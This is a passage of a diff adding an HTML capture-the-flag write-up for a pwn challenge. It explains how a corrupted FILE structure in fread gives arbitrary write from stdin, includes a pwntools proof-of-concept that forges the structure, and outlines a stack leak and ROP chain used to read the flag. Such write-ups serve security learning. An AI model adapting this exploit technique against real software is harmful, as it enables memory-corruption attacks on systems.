+    <span style="color:#111">buf</span> <span style="color:#f92672">=</span> <span style="color:#111">memmove</span><span style="color:#111">(</span><span style="color:#111">buf</span><span style="color:#111">,</span> <span style="color:#f92672">&amp;</span><span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">buf</span><span style="color:#111">[</span><span style="color:#111">beg</span><span style="color:#111">],</span> <span style="color:#111">v13</span><span style="color:#111">);</span>
+    <span style="color:#111">fd</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">fd</span><span style="color:#111">;</span>
+    <span style="color:#111">v11</span> <span style="color:#f92672">=</span> <span style="color:#111">na</span><span style="color:#111">;</span>
+  <span style="color:#111">}</span>
+  <span style="color:#111">iov</span><span style="color:#111">[</span><span style="color:#ae81ff">0</span><span style="color:#111">].</span><span style="color:#111">iov_base</span> <span style="color:#f92672">=</span> <span style="color:#111">(</span><span style="color:#00a8c8">char</span> <span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#111">buf</span> <span style="color:#f92672">+</span> <span style="color:#111">v13</span><span style="color:#111">;</span>
+  <span style="color:#111">v15</span> <span style="color:#f92672">=</span> <span style="color:#111">v11</span> <span style="color:#f92672">-</span> <span style="color:#111">v13</span><span style="color:#111">;</span>
+  <span style="color:#111">iov</span><span style="color:#111">[</span><span style="color:#ae81ff">0</span><span style="color:#111">].</span><span style="color:#111">iov_len</span> <span style="color:#f92672">=</span> <span style="color:#111">v11</span> <span style="color:#f92672">-</span> <span style="color:#111">v13</span><span style="color:#111">;</span>
+  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">bufmode</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">||</span> <span style="color:#111">(</span><span style="color:#111">size</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">size</span><span style="color:#111">,</span> <span style="color:#111">v11</span> <span style="color:#f92672">&gt;=</span> <span style="color:#111">size</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span><span style="color:#111">;</span>
+    <span style="color:#111">v17</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span><span style="color:#111">;</span>
+  <span style="color:#111">}</span>
+  <span style="color:#00a8c8">else</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">v17</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">buf</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span><span style="color:#111">)</span><span style="color:#111">size</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xC</span> <span style="color:#111">)</span>
+      <span style="color:#111">size</span> <span style="color:#f92672">=</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span><span style="color:#111">)(</span><span style="color:#111">size</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">12</span><span style="color:#111">);</span>
+  <span style="color:#111">}</span>
+  <span style="color:#111">iov</span><span style="color:#111">[</span><span style="color:#ae81ff">1</span><span style="color:#111">].</span><span style="color:#111">iov_base</span> <span style="color:#f92672">=</span> <span style="color:#111">v17</span><span style="color:#111">;</span>
+  <span style="color:#111">iov</span><span style="color:#111">[</span><span style="color:#ae81ff">1</span><span style="color:#111">].</span><span style="color:#111">iov_len</span> <span style="color:#f92672">=</span> <span style="color:#111">size</span><span style="color:#111">;</span>
+  <span style="color:#111">v18</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#111">;</span>
+  <span style="color:#111">v19</span> <span style="color:#f92672">=</span> <span style="color:#111">iov</span><span style="color:#111">;</span>
+  <span style="color:#00a8c8">while</span> <span style="color:#111">(</span> <span style="color:#ae81ff">2</span> <span style="color:#111">)</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">v35</span> <span style="color:#f92672">=</span> <span style="color:#111">v15</span><span style="color:#111">;</span>
+    <span style="color:#111">v36</span> <span style="color:#f92672">=</span> <span style="color:#111">v18</span><span style="color:#111">;</span>
+    <span style="color:#111">n</span> <span style="color:#f92672">=</span> <span style="color:#111">(</span><span style="color:#111">size_t</span><span style="color:#111">)</span><span style="color:#111">v19</span><span style="color:#111">;</span>
+    <span style="color:#111">v20</span> <span style="color:#f92672">=</span> <span style="color:#111">readv</span><span style="color:#111">(</span><span style="color:#111">fd</span><span style="color:#111">,</span> <span style="color:#111">v19</span><span style="color:#111">,</span> <span style="color:#111">v18</span><span style="color:#111">);</span>
+</code></pre></div><p>we reach this part of the fread functions when f→buf does not have enough data to fulfill the the request of fread, so reads what’s left in f→buf and calls readv to read more data from the file into the user buffer, and in the way it also read’s in f-&gt;buf <code>f-&gt;size-0xc</code> bytes, we can use this in addition to changing the f-&gt;fd to 0 (stdin), so we can get arb write from stdin, here is a simple pwntools poc that shows how it’s done:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">def</span> <span style="color:#75af00">get_write</span><span style="color:#111">(</span><span style="color:#111">addr</span><span style="color:#111">,</span> <span style="color:#111">data</span><span style="color:#111">):</span>
+    <span style="color:#111">sz</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1001</span> <span style="color:#f92672">//</span> <span style="color:#111">size</span> <span style="color:#111">needs</span> <span style="color:#111">to</span> <span style="color:#111">be</span> <span style="color:#111">strictly</span> <span style="color:#111">bigger</span> <span style="color:#111">than</span> <span style="color:#111">what</span> <span style="color:#111">the</span> <span style="color:#111">user</span> <span style="color:#111">wants</span>
+    <span style="color:#111">beg</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+    <span style="color:#111">end</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+    <span style="color:#111">payload</span> <span style="color:#f92672">=</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000024200010100</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000000000000</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000000000000</span><span style="color:#111">)</span>\
+    <span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">beg</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">end</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#111">addr</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x2</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>\
+    <span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x000000000042f338</span><span style="color:#111">)</span><span style="color:#f92672">+</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x000000000042f3d8</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000000000000</span><span style="color:#111">)</span>
+
+    <span style="color:#111">write_to_FILE</span><span style="color:#111">(</span><span style="color:#111">payload</span><span style="color:#111">)</span>
+
+    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendlineafter</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;&gt;&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39;1&#39;</span><span style="color:#111">)</span> <span style="color:#f92672">//</span> <span style="color:#111">call</span> <span style="color:#111">fread</span>
+    <span style="color:#f92672">//</span> <span style="color:#111">after</span> <span style="color:#111">this</span> <span style="color:#111">it</span> <span style="color:#111">will</span> <span style="color:#111">read</span> <span style="color:#f92672">from</span> <span style="color:#111">stdin</span>
+    <span style="color:#111">pay</span> <span style="color:#f92672">=</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#111">(</span><span style="color:#ae81ff">0x1000</span><span style="color:#111">)</span> <span style="color:#f92672">//</span> <span style="color:#111">send</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#111">bytes</span> <span style="color:#00a8c8">for</span> <span style="color:#111">the</span> <span style="color:#111">user</span> <span style="color:#111">buffer</span>
+    <span style="color:#111">pay</span> <span style="color:#f92672">+=</span> <span style="color:#111">data</span>  <span style="color:#f92672">//</span> <span style="color:#111">the</span> <span style="color:#111">rest</span> <span style="color:#111">will</span> <span style="color:#111">be</span> <span style="color:#111">read</span> <span style="color:#111">into</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">buf</span>
+    <span style="color:#111">pay</span> <span style="color:#f92672">=</span> <span style="color:#111">pay</span> <span style="color:#f92672">+</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#111">(</span><span style="color:#ae81ff">0x1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4085</span><span style="color:#f92672">-</span><span style="color:#111">len</span><span style="color:#111">(</span><span style="color:#111">pay</span><span style="color:#111">))</span> <span style="color:#f92672">//</span> <span style="color:#111">readv</span> <span style="color:#111">will</span> <span style="color:#00a8c8">continue</span> <span style="color:#111">reading</span> <span style="color:#111">until</span> <span style="color:#111">it</span> <span style="color:#111">gets</span> <span style="color:#111">all</span> <span style="color:#111">the</span> <span style="color:#111">bytes</span> <span style="color:#111">it</span> <span style="color:#111">requests</span><span style="color:#111">,</span> <span style="color:#111">so</span> <span style="color:#111">we</span> <span style="color:#111">add</span> <span style="color:#111">this</span> <span style="color:#111">dummy</span> <span style="color:#111">data</span>
+    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">send</span><span style="color:#111">(</span><span style="color:#111">pay</span><span style="color:#111">)</span>  
+</code></pre></div><h2 id="exploitation">Exploitation:</h2>
+<p>now that we have both arb_read and arb_write, we can just get a stack addr from the binary memory and write into the return address of fread (because we can’t write into the ret of main, since it exits).</p>
+<p>we can get a stack leak by reading the value at <code>&amp;__argv</code> and then subtract the offset for the return address of fread, after that we just write our rop chain, apparently there are no binaries inside the jail of the docker container, so we have to read the flag.txt directly using the rop chain.</p>
+<p>the final exploit is <a href="/l3akctf2025-cosmofile/exploit.py">here</a>.</p>
+<p>running it gives us the flag : <code>L3AK{JU57_b3c4u43_7H3R3_15_N0_vft4bl3_D035N7_m34n_Y0U_5h0uld_61V3_up}</code></p>
+
+      
+      <div class="post-date">
+        <span class="g time">July 14, 2025 </span> &#8729;
+         
+         <a href="https://nothoudaifa.github.io/tags/ctf/">ctf</a> <a href="https://nothoudaifa.github.io/tags/pwn/">pwn</a>
+      </div>
+      
+    </section>
+    
+    
+    
+  </div>
+</main>
+</body>
+</html>
